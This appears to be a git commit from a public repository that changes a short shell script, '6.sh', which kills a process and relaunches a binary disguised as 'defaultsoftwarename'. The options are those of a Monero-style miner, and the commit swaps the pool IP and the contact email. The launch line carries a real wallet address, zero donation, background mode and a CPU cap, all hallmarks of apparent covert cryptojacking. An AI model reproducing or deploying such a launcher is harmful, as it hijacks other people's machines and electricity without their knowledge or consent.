8adc84ac1e1dfaeb7918c0ae45b70e19a2bbfd67
denloh899 <57492631+denloh899@users.noreply.github.com>
2019-11-08 01:15:19 +0800

    Update 6.sh

--- 6.sh
+++ 6.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o 87.255.31.180:28298 -u 4A8pN89PXJzByXLD7Ct2azbnfw2dfBhNb1sn9rnCdHveZEgnNtQGvw7iYtpHBtXKKner7Njrgq1gP4RyYJdCRMjvMMoBLGA --pass=x:tonymathews932@yahoo.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
+defaultsoftwarename -o 37.1.215.13:23281 -u 4A8pN89PXJzByXLD7Ct2azbnfw2dfBhNb1sn9rnCdHveZEgnNtQGvw7iYtpHBtXKKner7Njrgq1gP4RyYJdCRMjvMMoBLGA --pass=x:denloh899@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1 --variant -1
